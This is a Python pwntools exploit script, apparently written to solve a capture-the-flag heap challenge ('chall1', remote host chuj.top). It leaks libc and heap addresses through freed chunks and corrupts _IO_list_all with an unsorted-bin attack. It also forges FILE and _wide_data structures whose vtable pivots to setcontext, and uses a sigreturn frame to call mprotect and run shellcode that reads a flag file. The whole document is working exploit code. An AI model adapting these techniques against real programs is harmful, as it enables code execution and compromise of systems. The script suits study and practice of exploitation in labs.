#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './chall1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('> ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(con)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil('delete?\n')
    p.sendline(str(idx))

def edit(idx, con):
    eat()
    p.sendline('3')
    p.recvuntil('edit?\n')
    p.sendline(str(idx))
    p.recvuntil('content:\n')
    p.send(con)

def show(idx):
    eat()
    p.sendline('4')
    p.recvuntil('show?\n')
    p.sendline(str(idx))


add(0x478, '\n') #* 0
add(0x478, '\n') #* 1
add(0x478, '\n') #* 2
add(0x478, '\n') #* 3

dele(0)
dele(2)


show(0)
p.recvuntil('content:\n')
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x3c4b78
log.success("libc.address: "+hex(libc.address))
mprotect_addr = libc.symbols['mprotect']
log.success('mprotect_addr: ' + hex(mprotect_addr))
setcontext_addr = libc.symbols['setcontext']
log.success('setcontext_addr: ' + hex(setcontext_addr))
_IO_list_all = libc.symbols['_IO_list_all']
log.success("_IO_list_all: "+hex(_IO_list_all))

show(2)
p.recvuntil('content:\n')
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x540
log.success('heapbase: ' + hex(heapbase))

shellcode = asm(shellcraft.open("./flag", 0))
shellcode += asm(shellcraft.read(3, heapbase + 0x10, 0x30))
shellcode += asm(shellcraft.write(1, heapbase + 0x10, 0x30))
heap_addr = heapbase + 0x9c0 + 0x10  ## store sigreturn frame and shellcode, fake stack
log.success('heap_addr: ' + hex(heap_addr))
frame = SigreturnFrame()

frame.rdi = heapbase & 0xfffffffffffff000
frame.rsi = 0x21000
frame.rdx = 7

frame.rip = mprotect_addr
frame.rsp = heap_addr + len(bytes(frame))
# payload = str(frame)
print(len(bytes(frame)))
payload = bytes(frame) + p64(heap_addr + len(bytes(frame)) + 8) + shellcode

dele(1)
add(0x478, payload+b'\n')

add(0x478, '\n') #* 4
add(0x418, '\n') #* 5

# edit(1, payload+b'\n')


_wide_data_ptr = heapbase+0x13a0
vtable_addr = heapbase+0x13c0
# stream
stream1 = b'\x00'*0x410
stream1 += p64(heap_addr) + p64(0x61)
stream1 += p64(0) + p64(_IO_list_all-0x10)# fd bk
stream1 = stream1.ljust(0x68,b"\x00")

stream2 = b''
stream2 = stream2.ljust(0xa0-0x60-0x10,b"\x00")
stream2 += p64(_wide_data_ptr)# _wide_data_ptr
stream2 += 0x18*b'\x00'
stream2 += p32(1)# mode

payload2 = p32(0)
payload2 += p64(0)
payload2 += p64(0)# <-- _wide_data_ptr
payload2 += p64(vtable_addr)
payload2 += p64(0)# padding
payload2 += p64(2)# fp->_wide_data->_IO_write_base
payload2 += p64(3)# fp->_wide_data->_IO_write_ptr
payload2 += p64(0)*3 # vtable [0] [1] [2]
payload2 += p64(setcontext_addr+58)# [3]

edit(2, stream1 + b'\n')
edit(3, stream2+payload2+b'\n')
debug()
eat()
p.sendline('1')
p.recvuntil('size:\n')
p.sendline(str(0x410))



p.interactive()
